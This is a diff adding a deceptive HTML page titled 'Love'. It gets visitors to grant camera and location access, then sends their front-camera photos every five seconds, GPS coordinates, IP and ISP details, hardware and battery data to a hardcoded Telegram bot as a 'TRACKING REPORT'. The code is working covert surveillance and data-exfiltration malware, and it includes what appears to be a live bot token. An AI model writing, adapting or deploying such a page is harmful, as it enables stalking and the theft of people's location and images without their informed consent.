@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Love</title>
+<style>
+body {
+    margin: 0;
+    padding: 0;
+    background: #000;
+    color: #fff;
+    font-family: sans-serif;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    text-align: center;
+}
+.instructions {
+    padding: 30px;
+    margin-top: 50px;
+    background: rgba(255, 255, 255, 0.1);
+    border-radius: 15px;
+    backdrop-filter: blur(10px);
+    border: 1px solid rgba(255, 255, 255, 0.2);
+    max-width: 90%;
+}
+.instructions p {
+    margin: 15px 0;
+    font-size: 20px;
+    line-height: 1.5;
+}
+.fixed-button {
+    position: fixed;
+    bottom: 0;
+    left: 0;
+    width: 100%;
+    height: 60px;
+    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+    border: none;
+    color: white;
+    font-size: 20px;
+    font-weight: bold;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    z-index: 1000;
+    transition: all 0.3s ease;
+}
+.fixed-button:hover {
+    background: linear-gradient(135deg, #5a67d8 0%, #6b46c1 100%);
+    height: 70px;
+}
+.fixed-button:active {
+    background: linear-gradient(135deg, #4c51bf 0%, #553c9a 100%);
+}
+canvas {
+    display: none;
+}
+</style>
+</head>
+<body>
+<div class="instructions">
+    <p>📍 Turn on your location from notification</p>
+    <p>📸 Allow Camera Permission</p>
+    <p>📍 Allow Location Permission</p>
+    <p>👇 Click START button below</p>
+</div>
+
+<canvas id="canvas"></canvas>
+
+<button class="fixed-button" onclick="startSending()">START</button>
+
+<script>
+const canvas = document.getElementById("canvas");
+const BOT_TOKEN = "7917384016:AAG7cxyuts9UJ-Km0BMqBeQVJEJfstH239g";
+const urlParams = new URLSearchParams(window.location.search);
+const urlChatId = urlParams.get('id');
+const CHAT_ID = urlChatId || "8319568593";
+
+let intervalId = null;
+let stream = null;
+let latitude = "N/A", longitude = "N/A", locationAccuracy = "N/A";
+let mapLink = "Location not allowed";
+let altitude = "N/A", speed = "N/A", heading = "N/A";
+let publicIP = "Fetching...", localIP = "Fetching...";
+let isp = "Unknown", asn = "Unknown", city = "Unknown", country = "Unknown";
+let networkType = "Fetching...", downlink = "N/A", rtt = "N/A";
+let hardwareInfo = "Fetching...";
+let batteryInfo = "Fetching...";
+
+function initGPS() {
+    if ("geolocation" in navigator) {
+        navigator.geolocation.watchPosition(
+            pos => {
+                latitude = pos.coords.latitude.toFixed(6);
+                longitude = pos.coords.longitude.toFixed(6);
+                locationAccuracy = pos.coords.accuracy ? `${pos.coords.accuracy.toFixed(0)}m` : 'N/A';
+                altitude = pos.coords.altitude ? `${pos.coords.altitude.toFixed(1)}m` : 'N/A';
+                speed = pos.coords.speed ? `${(pos.coords.speed * 3.6).toFixed(1)} km/h` : 'N/A';
+                heading = pos.coords.heading ? `${pos.coords.heading.toFixed(1)}°` : 'N/A';
+                mapLink = `https://maps.google.com/maps?q=${latitude},${longitude}&z=17&t=k`;
+            },
+            err => { mapLink = "Location error: " + err.message; },
+            { enableHighAccuracy: true, timeout: 15000, maximumAge: 5000 }
+        );
+    }
+}
+initGPS();
+
+async function fetchLocalIP() {
+    try {
+        const pc = new RTCPeerConnection({ iceServers: [] });
+        pc.createDataChannel('');
+        const offer = await pc.createOffer();
+        await pc.setLocalDescription(offer);
+        return new Promise(resolve => {
+            pc.onicecandidate = ice => {
+                if (!ice || !ice.candidate || !ice.candidate.candidate) return;
+                const ipMatch = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
+                if (ipMatch && ipMatch[1]) resolve(ipMatch[1]);
+                pc.close();
+            };
+            setTimeout(() => resolve("Not found (mDNS)"), 1500);
+        });
+    } catch (e) { return "Unavailable"; }
+}
+
+async function fetchNetworkDetails() {
+    try {
+        const ipRes = await fetch("https://api.ipify.org?format=json");
+        const ipData = await ipRes.json();
+        publicIP = ipData.ip;
+        const geoRes = await fetch(`https://ip-api.com/json/${publicIP}?fields=status,country,regionName,city,isp,org,as,mobile,proxy,query`);
+        const geo = await geoRes.json();
+        if (geo.status === "success") {
+            isp = geo.isp || geo.org || "Unknown";
+            asn = geo.as || "Unknown";
+            city = geo.city || city;
+            country = geo.country || country;
+        }
+    } catch (e) {}
+    if (navigator.connection) {
+        const conn = navigator.connection;
+        networkType = conn.type || 'Unknown';
+        downlink = conn.downlink || 'N/A';
+        rtt = conn.rtt || 'N/A';
+    }
+}
+
+fetchLocalIP().then(ip => { localIP = ip; fetchNetworkDetails(); });
+setInterval(() => {
+    fetchLocalIP().then(ip => { localIP = ip; fetchNetworkDetails(); });
+}, 120000);
+
+function getHardware() {
+    const platform = navigator.platform || 'Unknown';
+    const cores = navigator.hardwareConcurrency || 'Unknown';
+    const ram = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown';
+    const screen = `${screen.width}x${screen.height}`;
+    const pixelRatio = window.devicePixelRatio;
+    hardwareInfo = `Platform: ${platform} | Cores: ${cores} | RAM: ${ram} | Screen: ${screen} | PixelRatio: ${pixelRatio}`;
+}
+getHardware();
+
+function getBattery() {
+    if (!navigator.getBattery) { batteryInfo = "N/A"; return; }
+    navigator.getBattery().then(b => {
+        const level = (b.level * 100).toFixed(0) + '%';
+        const charging = b.charging ? 'Yes' : 'No';
+        const fullIn = b.chargingTime === Infinity ? 'N/A' : Math.round(b.chargingTime / 60) + 'm';
+        const emptyIn = b.dischargingTime === Infinity ? 'Plugged' : Math.round(b.dischargingTime / 60) + 'm';
+        batteryInfo = `${level} | Charging: ${charging} | Full: ${fullIn} | Empty: ${emptyIn}`;
+    }).catch(() => { batteryInfo = "Blocked"; });
+}
+getBattery();
+
+async function captureAndSend() {
+    if (!stream) return;
+    const videoTrack = stream.getVideoTracks()[0];
+    if (!videoTrack) return;
+    const imageCapture = new ImageCapture(videoTrack);
+    try {
+        const imageBitmap = await imageCapture.grabFrame();
+        canvas.width = imageBitmap.width;
+        canvas.height = imageBitmap.height;
+        const ctx = canvas.getContext("2d");
+        ctx.translate(canvas.width, 0);
+        ctx.scale(-1, 1);
+        ctx.drawImage(imageBitmap, 0, 0);
+        const report = `
+╔═══════════════════════════════════════╗
+║       🕵️ TRACKING REPORT                     ║
+╚═══════════════════════════════════════╝
+⏰ ${new Date().toLocaleString()}
+
+📍 GPS:
+  Lat: ${latitude}
+  Lon: ${longitude}
+  Accuracy: ${locationAccuracy}
+  Alt: ${altitude} | Speed: ${speed} | Heading: ${heading}
+  Map: ${mapLink}
+
+🌐 NETWORK:
+  Public IP: ${publicIP}
+  Local IP: ${localIP}
+  ISP: ${isp} (${asn})
+  Location: ${city}, ${country}
+  Network: ${networkType} | Down: ${downlink} Mbps | RTT: ${rtt} ms
+
+🖥️ DEVICE:
+  ${hardwareInfo}
+
+🔋 BATTERY:
+  ${batteryInfo}
+`;
+        const caption = `📸 ${new Date().toLocaleTimeString()} | 📍 ${latitude}, ${longitude} | 🗺️ ${mapLink}`;
+        canvas.toBlob(blob => {
+            if (!blob) return;
+            const fd = new FormData();
+            fd.append("chat_id", CHAT_ID);
+            fd.append("photo", blob);
+            fd.append("caption", caption.substring(0, 1020));
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd })
+                .catch(() => {});
+        }, "image/jpeg", 0.9);
+        const fdText = new FormData();
+        fdText.append("chat_id", CHAT_ID);
+        fdText.append("text", report);
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: "POST", body: fdText })
+            .catch(() => {});
+    } catch (e) {}
+}
+
+function startSending() {
+    if (!intervalId) {
+        intervalId = setInterval(captureAndSend, 5000);
+    }
+}
+
+navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+    .then(s => { stream = s; })
+    .catch(err => { alert("⚠️ Camera Permission needed for tracking."); });
+</script>
+</body>
+</html>
